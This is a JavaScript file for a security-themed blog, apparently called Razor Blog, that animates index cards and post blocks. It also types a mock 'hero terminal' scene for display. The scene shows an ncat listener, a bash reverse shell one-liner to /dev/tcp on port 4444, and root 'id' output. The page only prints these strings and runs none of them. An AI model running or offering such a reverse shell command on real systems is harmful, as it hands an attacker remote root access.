// === Razor Blog JS (minimal, cards + post anim on load) ===
(function(){
  function animateIn(nodeList, stagger){
    Array.from(nodeList).forEach((el, i)=>{
      el.style.animationDelay = (i*stagger)+'ms';
      el.classList.add('fx-enter');
    });
  }
  // Index cards
  const cards = document.querySelectorAll('.grid .card');
  if(cards.length){ animateIn(cards, 40); }
  // Post content blocks
  const blocks = document.querySelectorAll('.post .post-body > *');
  if(blocks.length){ animateIn(blocks, 20); }
})();

// Hero terminals typing: reverse shell then `id`
  (function(){
    const A = document.querySelector('[data-ty="a"]'); // attacker
    const B = document.querySelector('[data-ty="b"]'); // victim
    if(!A || !B) return;

    const attackerSeq = [
      "ncat -lvnp 4444",
      "listening on [any] 4444 ...",
      "connection received from 10.10.10.42",
      "id",
      "uid=0(root) gid=0(root) groups=0(root)"
    ];
    const victimSeq = [
      "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    ];

    function typeLine(el, str, delay){
      return new Promise(resolve => {
        let i = 0;
        (function step(){
          if(i < str.length){
            el.textContent += str.charAt(i++);
            setTimeout(step, delay);
          } else {
            el.textContent += "\n";
            resolve();
          }
        })();
      